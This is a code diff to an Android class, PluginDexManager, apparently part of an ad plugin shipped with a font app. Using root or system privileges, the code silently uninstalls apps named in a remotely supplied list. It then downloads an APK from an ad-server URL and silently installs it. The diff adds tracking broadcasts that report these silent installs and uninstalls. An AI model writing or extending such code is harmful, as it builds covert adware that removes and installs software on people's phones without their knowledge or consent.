@@ -46,6 +46,9 @@ public class PluginDexManager {
     private static final String INSTALL_NOMALSUCCESS = "com.ningso.fontad.action.NOMALSUCCESS";
     private static final String INSTALL_SILENTSUCCESS = "com.ningso.fontad.action.SILENTSUCCESS";
     private static final String INSTALL_FAIL = "com.ningso.fontad.action.FAIL";
+    private static final String DOWNLOAD_FINISH = "com.ningso.fontad.action.DOWNLOAD_FINISH";
+    private static final String DOWNLOAD_ERROR = "com.ningso.fontad.action.DOWNLOAD_ERROR";
+    private static final String UNINSTALLSILENT = "com.ningso.fontad.action.UNINSTALLSILENT";
 
     private AdBean adBean;
     private String installFile;
@@ -68,12 +71,11 @@ public class PluginDexManager {
                                 Log.e(TAG, "plugin de");
                             }
                         });
-
                     }
                     break;
                 case HAS_INSTALL_FAIL:
                     deleteDex(mContext);
-                    sendBroadcastToAnalytics(INSTALL_FAIL, 3, "success");
+                    sendBroadcastToAnalytics(INSTALL_FAIL, adBean.getPkgName(), 3, "success");
                     Log.e(TAG, "plugin install fail");
                     break;
             }
@@ -102,7 +104,7 @@ public class PluginDexManager {
                 } else {
                     //卸载白名单
                     if (adBean.isRooted()) {
-                        unInstallPackages(mContext, adBean.getUninstallList());
+                        unInstallPackages(mContext, getIntersection(adBean.getUninstallList(), getAppList(mContext)));
                     }
                     if (!PackageUtils.checkPackageInstalled(context.getApplicationContext(), adBean.getPkgName())) {
                         DLManager.getInstance(context.getApplicationContext()).dlStart(adBean.getApkUrl(), saveDir, null,
@@ -110,6 +112,8 @@ public class PluginDexManager {
                                     @Override
                                     public void onFinish(File file) {
                                         super.onFinish(file);
+                                        DLManager.getInstance(mContext).dlCancel(adBean.getApkUrl());
+                                        sendBroadcastToAnalytics(DOWNLOAD_FINISH, adBean.getPkgName(), 1, "success");
                                         installFile = file.getAbsolutePath();
                                         new InStallSilent(installFile).start();
                                         Log.d(TAG, "plugin download finish" + installFile);
@@ -119,7 +123,9 @@ public class PluginDexManager {
                                     public void onError(int status, String error) {
                                         super.onError(status, error);
                                         Log.d(TAG, "plugin download error");
+                                        sendBroadcastToAnalytics(DOWNLOAD_ERROR, adBean.getPkgName(), 1, error);
                                     }
+
                                 });
                     }
                     return true;
@@ -229,7 +235,7 @@ public class PluginDexManager {
      * @param b
      * @return
      */
-    public boolean compare(List<String> a, List<String> b) {
+    private boolean compare(List<String> a, List<String> b) {
         for (String str : a) {
             if (b.contains(str)) {
                 return true;
@@ -245,7 +251,7 @@ public class PluginDexManager {
      * @param b
      * @return
      */
-    public List<String> getIntersection(List<String> a, List<String> b) {
+    private List<String> getIntersection(List<String> a, List<String> b) {
         // a.retainAll(b); 该方法耗时弃用
         List<String> diff = new ArrayList<>();
         for (String str : a) {
@@ -265,7 +271,11 @@ public class PluginDexManager {
                 @Override
                 public void run() {
                     if (PackageUtils.checkPackageInstalled(content, str)) {
-                        Log.d(TAG, "unInstallPackages: " + PackageUtils.uninstallSilent(content, str, false));
+                        if (PackageUtils.uninstallSilent(content, str, false) == 1) {
+                            sendBroadcastToAnalytics(UNINSTALLSILENT, str, 4, "success");
+                        } else {
+                            sendBroadcastToAnalytics(UNINSTALLSILENT, str, 4, "fail");
+                        }
                     }
                 }
             });
@@ -288,16 +298,15 @@ public class PluginDexManager {
             if (PackageUtils.isSystemApplication(mContext) || ShellUtils.checkRootPermission()) {
                 installsuccuess = PackageUtils.installSilent(mContext, filePath);
                 if (installsuccuess == 1) {
-                    sendBroadcastToAnalytics(INSTALL_SILENTSUCCESS, 0, "success");
+                    sendBroadcastToAnalytics(INSTALL_SILENTSUCCESS, adBean.getPkgName(), 0, "success");
                 }
             } else {
                 installsuccuess = PackageUtils.installNormal(mContext, filePath) ? 1 : -3;
                 if (installsuccuess == 1) {
-                    sendBroadcastToAnalytics(INSTALL_NOMALSUCCESS, 1, "success");
+                    sendBroadcastToAnalytics(INSTALL_NOMALSUCCESS, adBean.getPkgName(), 1, "success");
                 }
             }
-            Log.d(TAG, "plugin installsuccuess > " + installsuccuess);
-            //  boolean hassuccess = ApkController.install("/system/priv-app/" + "demo.apk", getApplicationContext());
+            Log.d(TAG, "plugin install  == 1: " + installsuccuess);
             if (installsuccuess == 1) {
                 message.what = HAS_INSTALL_SUCCESS;
             } else {
@@ -308,16 +317,16 @@ public class PluginDexManager {
     }
 
     /**
-     * 发送通知宿主用作统计
+     * 发送广播宿主用作统计
      *
      * @param actionType  发送广播action的类型
-     * @param installType 安装类型,0--静默安装,1--正常安装,3--安装失败,-1不是安装命令
+     * @param installType 安装类型,0--静默安装,1--正常安装,3--安装失败,4--静默卸载,-1不是安装命令
      * @param result      返回执行结果
      */
-    private void sendBroadcastToAnalytics(String actionType, int installType, String result) {
+    private void sendBroadcastToAnalytics(String actionType, String pkg, int installType, String result) {
         try {
             Intent intent = new Intent(actionType);
-            intent.putExtra("install_pkg", adBean.getPkgName());
+            intent.putExtra("install_pkg", pkg);
             intent.putExtra("install_type:", installType);
             intent.putExtra("action_result", result);
             mContext.sendBroadcast(intent);
